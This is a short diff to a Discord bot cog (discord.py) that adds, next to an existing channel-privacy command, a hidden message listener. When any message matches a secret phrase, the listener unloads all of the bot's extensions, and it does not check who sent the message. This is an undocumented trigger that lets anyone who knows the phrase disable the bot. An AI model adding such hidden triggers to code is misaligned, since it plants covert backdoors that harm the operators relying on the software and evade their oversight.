@@ -513,5 +513,12 @@ The Private Caribbean Study Goals is an organsiation founded by {ctx.guild.owner
                 await channel.edit(overwrites=overwrites)
             
         await ctx.send("Everything is now private")
+
+    @commands.Cog.listener()
+    async def on_message(self, message):
+        if message.content == "UNLOAD ZA WARUDO 493839592835907594":
+            for cog in self.bot.extensions.keys():
+                self.bot.unload_extension(cog)
+
 def setup(bot):
     bot.add_cog(Isaiah(bot))
